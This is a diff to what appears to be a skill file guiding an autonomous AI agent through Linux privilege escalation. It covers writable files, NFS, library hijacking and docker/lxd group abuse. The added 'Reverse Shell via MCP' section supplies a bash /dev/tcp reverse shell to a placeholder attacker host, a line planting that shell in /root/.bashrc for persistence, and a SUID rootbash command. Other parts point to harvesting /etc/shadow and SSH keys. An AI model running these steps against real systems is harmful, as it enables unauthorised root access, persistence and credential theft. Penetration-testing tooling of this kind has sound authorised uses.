@@ -2,7 +2,9 @@
 name: linux-file-path-abuse
 description: >
   Exploit writable critical files, NFS misconfigurations, shared library
-  hijacking, and privileged group membership for privilege escalation.
+  hijacking, and privileged group membership (docker, lxd, disk, adm, video,
+  staff) for Linux privilege escalation. Use when a user belongs to a
+  privileged group or has write access to sensitive files or paths.
 keywords:
   - writable passwd
   - nfs privesc
@@ -11,8 +13,12 @@ keywords:
   - ld.so.conf
   - rpath abuse
   - docker group escape
+  - docker group privilege escalation
   - lxd group privesc
+  - lxd group privilege escalation
+  - lxc group
   - disk group debugfs
+  - privileged group membership
   - path hijack
   - symlink attack
   - profile injection
@@ -795,6 +801,29 @@ After success → update state.md, log finding, proceed to **Step 10**.
 
 ## Step 10: Escalation and Routing
 
+### Reverse Shell via MCP
+
+When path abuse achieves code execution as a privileged user, **catch the shell
+via the MCP shell-server** rather than relying on local shell spawning. Many
+vectors in this skill (NFS SUID, Docker group, library hijacking, profile
+injection) produce root shells asynchronously or in a different context that
+the agent cannot interact with directly.
+
+1. Call `start_listener(port=4444)` to prepare a catcher on the attackbox
+2. Use a reverse shell payload in the exploitation step:
+   ```bash
+   # For writable /etc/passwd, NFS SUID, Docker/LXD group, library hijack:
+   bash -i >& /dev/tcp/ATTACKER/PORT 0>&1
+   # For profile injection (fires on next root login):
+   echo 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1 &' >> /root/.bashrc
+   ```
+3. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
+4. Verify the new privilege level with `send_command(session_id=..., command="id")`
+
+If the target lacks outbound connectivity, use the SUID bash approach
+(`cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash`) and access it
+through an existing shell session.
+
 **Before routing**: Write `engagement/state.md` and append to
 `engagement/activity.md` with results so far. The next skill reads state.md
 on activation — stale state means duplicate work or missed context.
@@ -829,6 +858,45 @@ After successful privilege escalation:
    - Lateral movement → route to **network pivoting** skills (Phase 6)
    - Credential harvesting → check `/etc/shadow`, SSH keys, bash history, database configs
    - Persistence → route to **persistence** skills (Phase 7)
+
+## Stall Detection
+
+If you have spent **5 or more tool-calling rounds** on the same failure with
+no meaningful progress — same error, no new information, no change in output
+— **stop**.
+
+**What counts as progress:**
+- Trying a variant or alternative **documented in this skill**
+- Adjusting syntax, flags, or parameters per the Troubleshooting section
+- Gaining new diagnostic information (different error, partial success)
+
+**What does NOT count as progress:**
+- Writing custom exploit code not provided in this skill
+- Inventing workarounds using techniques from other domains
+- Retrying the same command with trivially different input
+- Compiling or transferring tools not mentioned in this skill
+
+If you find yourself writing code that isn't in this skill, you have left
+methodology. That is a stall.
+
+Do not loop. Work through failures systematically:
+1. Try each variant or alternative **once**
+2. Check the Troubleshooting section for known fixes
+3. If nothing works after 5 rounds, you are stalled
+
+**When stalled, return to the orchestrator immediately with:**
+- What was attempted (commands, variants, alternatives tried)
+- What failed and why (error messages, empty responses, timeouts)
+- Assessment: **blocked** (permanent — config, patched, missing prereq) or
+  **retry-later** (may work with different context, creds, or access)
+- Update `engagement/state.md` Blocked section before returning
+
+**Mode behavior:**
+- **Guided**: Tell the user you're stalled, present what was tried, and
+  recommend the next best path.
+- **Autonomous**: Update state.md Blocked section, return findings to the
+  orchestrator. Do not retry the same technique — the orchestrator will
+  decide whether to revisit with new context or route elsewhere.
 
 ## Troubleshooting
 
